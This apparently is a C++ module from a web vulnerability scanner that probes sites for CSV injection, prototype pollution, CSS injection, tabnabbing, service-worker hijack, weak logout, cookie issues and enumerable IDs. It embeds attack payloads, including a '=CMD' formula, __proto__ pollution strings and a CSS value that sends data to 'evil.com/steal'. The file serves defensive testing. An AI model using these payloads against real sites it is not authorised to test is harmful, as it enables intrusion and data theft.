/// @file scanners/remaining_web.cpp
/// @brief Remaining web scanners: CSV injection, prototype pollution, CSS injection,
///        tabnabbing, service worker abuse, weak logout, insecure remember-me.
#include "scanner_base.hpp"

///
/// @details This scanner module is part of the apex-cli security scanning
/// framework. Each scanner function follows the standard signature:
///   std::vector<Finding>(const Config&, HttpClient&, const CrawlResult&)
///
/// Findings are categorized by severity: critical, high, medium, low, info.
/// All scanners run concurrently and results are deduplicated by the
/// scanner orchestrator (scanner.cpp).
///
/// @see scanner_base.hpp for shared types and helper functions.
/// @see scanner.hpp for the Finding struct and Scanner registration.
/// @note Scanners should be non-destructive and respect rate limits.

namespace apex {
namespace {

/// Scanner implementation.
/// @brief Scan for csv_injection vulnerabilities.
std::vector<Finding> scan_csv_injection(const Config&, HttpClient& http, const CrawlResult& crawl) {
  // Accumulate findings for this scanner.
  // Accumulate findings for this scanner.
  // Accumulate findings for this scanner.
  std::vector<Finding> findings;
  // Test if user input ends up in CSV/Excel exports without sanitization.
  const std::string payload = "=CMD(\"calc\")";
  // Iterate over targets.
  // Process each crawled URL.
  // Process each crawled URL.
  // Process each crawled URL.
  for (const auto& url : crawl.urls) {
    auto targets = get_targets(crawl, url, "name");
    for (const auto& [base, param] : targets) {
      auto resp = http.get(base + payload);
      if (resp.body.find("=CMD") != std::string::npos || resp.body.find("=HYPERLINK") != std::string::npos) {
        findings.push_back({"CSV Injection", "medium", base + payload, "Formula payload reflected — CSV/Excel injection possible", param,
                            payload, "=CMD"});
      }
    }
    if (!findings.empty()) break;
  }
  // Return collected findings.
  // Return collected findings.
  // Return collected findings.
  return findings;
}

/// Scanner implementation.
/// @brief Scan for prototype_pollution vulnerabilities.
std::vector<Finding> scan_prototype_pollution(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  // Early return if no URLs to scan.
  // Skip if no URLs available.
  // Skip if no URLs available.
  // Skip if no URLs available.
  if (crawl.urls.empty()) return findings;
  // Determine base URL for requests.
  // Determine base URL for requests.
  // Determine base URL for requests.
  std::string base = base_url_from(crawl.urls[0]);

  // Test __proto__ pollution via query params and JSON body.
  const std::vector<std::string> payloads = {
      "?__proto__[polluted]=true",
      "?constructor[prototype][polluted]=true",
      "?__proto__.polluted=true",
  };

  // Iterate over targets.
  for (const auto& url : crawl.urls) {
    for (const auto& p : payloads) {
      auto resp = http.get(url + p);
      if (resp.body.find("polluted") != std::string::npos && resp.body.find("true") != std::string::npos) {
        findings.push_back({"Prototype Pollution", "high", url + p, "Prototype pollution via query parameter", "__proto__", p, "polluted"});
        return findings;
      }
    }
    // JSON body variant.
    auto resp = http.post(url, R"({"__proto__":{"polluted":"true"}})", "application/json");
    if (resp.body.find("polluted") != std::string::npos) {
      findings.push_back({"Prototype Pollution", "high", url, "Prototype pollution via JSON __proto__", "__proto__",
                          R"({"__proto__":{"polluted":"true"}})", ""});
      return findings;
    }
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for css_injection vulnerabilities.
std::vector<Finding> scan_css_injection(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  std::string payload = "color:red;background:url(https://evil.com/steal)";
  // Iterate over targets.
  for (const auto& url : crawl.urls) {
    auto targets = get_targets(crawl, url, "style");
    for (const auto& [base, param] : targets) {
      auto resp = http.get(base + payload);
      if (resp.body.find("evil.com/steal") != std::string::npos) {
        findings.push_back(
            {"CSS Injection", "medium", base + payload, "CSS payload reflected — data exfiltration via CSS possible", param, payload, ""});
        return findings;
      }
    }
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for tabnabbing vulnerabilities.
std::vector<Finding> scan_tabnabbing(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  // Iterate over targets.
  for (const auto& url : crawl.urls) {
    auto resp = http.get(url);
    // Look for target="_blank" without rel="noopener"
    std::regex link_re(R"(<a[^>]+target\s*=\s*["']_blank["'][^>]*>)");
    auto begin = std::sregex_iterator(resp.body.begin(), resp.body.end(), link_re);
    auto end = std::sregex_iterator();
    for (auto it = begin; it != end; ++it) {
      std::string tag = (*it)[0].str();
      if (tag.find("noopener") == std::string::npos && tag.find("noreferrer") == std::string::npos) {
        findings.push_back({"Tabnabbing", "low", url, "Link with target=_blank missing rel=noopener — reverse tabnabbing possible", "", "",
                            tag.substr(0, 100)});
        return findings;
      }
    }
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for service_worker vulnerabilities.
std::vector<Finding> scan_service_worker(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  // Early return if no URLs to scan.
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Check for exposed/hijackable service worker registration.
  const std::vector<std::string> sw_paths = {"/sw.js", "/service-worker.js", "/serviceworker.js", "/firebase-messaging-sw.js",
                                             "/ngsw-worker.js"};

  // Iterate over targets.
  for (const auto& path : sw_paths) {
    auto resp = http.get(base + path);
    if (resp.status_code == 200 && resp.body.size() > 50 &&
        (resp.body.find("addEventListener") != std::string::npos || resp.body.find("self.") != std::string::npos)) {
      // Check if SW scope is overly broad.
      findings.push_back(
          {"Service Worker Exposed", "info", base + path, "Service worker accessible — check scope and cache strategy", "", "", ""});

      // Check for importScripts from external domains.
      if (resp.body.find("importScripts") != std::string::npos && resp.body.find("http") != std::string::npos) {
        findings.push_back({"Service Worker External Import", "medium", base + path,
                            "Service worker imports external scripts — supply chain risk", "", "", ""});
      }
      break;
    }
  }

  // Check if we can register a SW via XSS (JSONP/upload endpoint).
  // Iterate over targets.
  for (const auto& url : crawl.urls) {
    auto targets = get_targets(crawl, url, "callback");
    for (const auto& [tbase, param] : targets) {
      auto resp = http.get(tbase + "self.addEventListener('fetch',e=>{})//");
      auto ct = resp.headers.find("Content-Type");
      if (resp.status_code == 200 && ct != resp.headers.end() && ct->second.find("javascript") != std::string::npos) {
        findings.push_back(
            {"Service Worker Hijack via JSONP", "high", tbase, "JSONP endpoint could be abused as service worker", param, "", ""});
        return findings;
      }
    }
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for weak_logout vulnerabilities.
std::vector<Finding> scan_weak_logout(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  // Early return if no URLs to scan.
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);

  // Get a session, then "logout", then try to reuse the session.
  auto r1 = http.get(crawl.urls[0]);
  std::string session;
  // Iterate over targets.
  for (const auto& [h, v] : r1.headers) {
    if (h == "Set-Cookie" && (v.find("session") != std::string::npos || v.find("token") != std::string::npos)) {
      session = v.substr(0, v.find(';'));
      break;
    }
  }
  if (session.empty()) return findings;

  // Hit logout endpoints.
  // Iterate over targets.
  for (const auto& path : {"/logout", "/api/logout", "/auth/logout", "/signout"}) {
    http.get(base + path, {{"Cookie", session}});
  }

  // Try reusing the old session.
  auto r2 = http.get(crawl.urls[0], {{"Cookie", session}});
  if (r2.status_code == 200 && r2.body.size() > 100 && r2.body.find("login") == std::string::npos &&
      r2.body.find("sign in") == std::string::npos) {
    findings.push_back(
        {"Weak Logout", "medium", base, "Session still valid after logout — token not invalidated server-side", "", "", session});
  }
  return findings;
}

/// Scanner implementation.
/// @brief Scan for insecure_remember_me vulnerabilities.
std::vector<Finding> scan_insecure_remember_me(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  // Early return if no URLs to scan.
  if (crawl.urls.empty()) return findings;

  // Send HTTP request.
  // Send HTTP request.
  // Send HTTP request.
  auto resp = http.get(crawl.urls[0]);
  // Iterate over targets.
  for (const auto& [h, v] : resp.headers) {
    if (h != "Set-Cookie") continue;
    bool is_remember =
        v.find("remember") != std::string::npos || v.find("persistent") != std::string::npos || v.find("stay_logged") != std::string::npos;
    if (!is_remember) continue;

    // Check for insecure flags.
    bool missing_httponly = v.find("HttpOnly") == std::string::npos;
    bool missing_secure = v.find("Secure") == std::string::npos;
    bool predictable = false;

    // Check if value looks predictable (base64 of username, sequential, etc.)
    size_t eq = v.find('=');
    size_t semi = v.find(';');
    if (eq != std::string::npos && semi != std::string::npos) {
      std::string val = v.substr(eq + 1, semi - eq - 1);
      // Short or numeric = likely predictable.
      if (val.size() < 16 || val.find_first_not_of("0123456789") == std::string::npos) predictable = true;
    }

    if (missing_httponly || missing_secure || predictable) {
      std::string detail = "Remember-me cookie issues:";
      if (missing_httponly) detail += " missing HttpOnly;";
      if (missing_secure) detail += " missing Secure;";
      if (predictable) detail += " predictable value;";
      findings.push_back({"Insecure Remember-Me Token", "medium", crawl.urls[0], detail, "", "", v.substr(0, 80)});
    }
  }
  return findings;
}

/// XS-Leaks — cross-site information leakage via timing/error oracles.
/// Scanner implementation.
/// @brief Scan for xs_leaks vulnerabilities.
std::vector<Finding> scan_xs_leaks(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  // Early return if no URLs to scan.
  if (crawl.urls.empty()) return findings;
  std::string base = base_url_from(crawl.urls[0]);
  // Check if error pages differ for authenticated vs unauthenticated resources.
  auto r1 = http.get(base + "/api/user/1");
  auto r2 = http.get(base + "/api/user/99999");
  if (r1.status_code != r2.status_code && r1.status_code != 404 && r2.status_code != 404) {
    findings.push_back({"XS-Leaks", "medium", base,
                        "Different status codes for valid/invalid resources (" + std::to_string(r1.status_code) + " vs " +
                            std::to_string(r2.status_code) + ")",
                        "", "", ""});
  }
  return findings;
}

/// Cookie Tossing — set cookies from subdomain to parent.
/// Scanner implementation.
/// @brief Scan for cookie_tossing vulnerabilities.
std::vector<Finding> scan_cookie_tossing(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  // Early return if no URLs to scan.
  if (crawl.urls.empty()) return findings;
  auto resp = http.get(crawl.urls[0]);
  // Iterate over targets.
  for (const auto& [name, value] : resp.headers) {
    if (name != "Set-Cookie") continue;
    // Vulnerable if cookie domain is set to parent domain without __Host- prefix.
    if (value.find("Domain=") != std::string::npos && value.find("__Host-") == std::string::npos) {
      findings.push_back(
          {"Cookie Tossing", "low", crawl.urls[0], "Cookie with Domain attribute (tossing possible)", "", "", value.substr(0, 100)});
    }
  }
  return findings;
}

/// Second Order Injection — inject payloads that trigger on later retrieval.
/// Scanner implementation.
/// @brief Scan for second_order vulnerabilities.
std::vector<Finding> scan_second_order(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  const std::string canary = "apex_2nd_order_" + std::to_string(time(nullptr));
  // Iterate over targets.
  for (const auto& form : crawl.forms) {
    if (form.method != "POST") continue;
    // Submit canary value.
    std::string body;
    for (const auto& f : form.fields) {
      if (!body.empty()) body += "&";
      body += f.name + "=" + canary;
    }
    http.post(form.action, body, "application/x-www-form-urlencoded");
  }
  // Check if canary appears anywhere after submission.
  // Iterate over targets.
  for (const auto& url : crawl.urls) {
    auto resp = http.get(url);
    if (resp.body.find(canary) != std::string::npos) {
      findings.push_back({"Second Order Injection", "high", url, "Stored input reflected on different page", "", canary, ""});
    }
  }
  return findings;
}

/// Param Discovery — brute-force hidden parameters.
/// Scanner implementation.
/// @brief Scan for param_discovery vulnerabilities.
std::vector<Finding> scan_param_discovery(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  const std::vector<std::string> params = {"debug",  "test",  "admin", "verbose", "internal", "dev",     "staging",
                                           "secret", "token", "key",   "api_key", "callback", "redirect"};
  // Iterate over targets.
  for (const auto& url : crawl.urls) {
    auto baseline = http.get(url);
    for (const auto& p : params) {
      auto resp = http.get(url + "?" + p + "=1");
      if (resp.body.size() != baseline.body.size() && resp.status_code == 200 &&
          std::abs((long)resp.body.size() - (long)baseline.body.size()) > 50) {
        findings.push_back({"Param Discovery", "low", url, "Hidden param '" + p + "' changes response", p, "1", ""});
      }
    }
  }
  return findings;
}

/// Param Value Enum — enumerate valid values for discovered params.
/// Scanner implementation.
/// @brief Scan for param_value_enum vulnerabilities.
std::vector<Finding> scan_param_value_enum(const Config&, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  // Iterate over targets.
  for (const auto& url : crawl.urls) {
    for (const auto& p : crawl.params) {
      if (p.url != url) continue;
      if (p.name.find("id") == std::string::npos && p.name.find("user") == std::string::npos) continue;
      // Try sequential IDs.
      int valid = 0;
      for (int i = 1; i <= 5; ++i) {
        auto resp = http.get(p.url + "?" + p.name + "=" + std::to_string(i));
        if (resp.status_code == 200 && resp.body.size() > 100) ++valid;
      }
      if (valid >= 3) {
        findings.push_back(
            {"Param Value Enum", "medium", url, "Sequential IDs enumerable (" + std::to_string(valid) + "/5 valid)", p.name, "1-5", ""});
      }
    }
  }
  return findings;
}

}  // namespace

std::vector<Scanner> register_remaining_web_scanners() {
  return {
      {"CSV Injection", scan_csv_injection},
      {"Prototype Pollution", scan_prototype_pollution},
      {"CSS Injection", scan_css_injection},
      {"Tabnabbing", scan_tabnabbing},
      {"Service Worker", scan_service_worker},
      {"Weak Logout", scan_weak_logout},
      {"Insecure Remember-Me", scan_insecure_remember_me},
      {"XS-Leaks", scan_xs_leaks},
      {"Cookie Tossing", scan_cookie_tossing},
      {"Second Order Injection", scan_second_order},
      {"Param Discovery", scan_param_discovery},
      {"Param Value Enum", scan_param_value_enum},
  };
}

}  // namespace apex
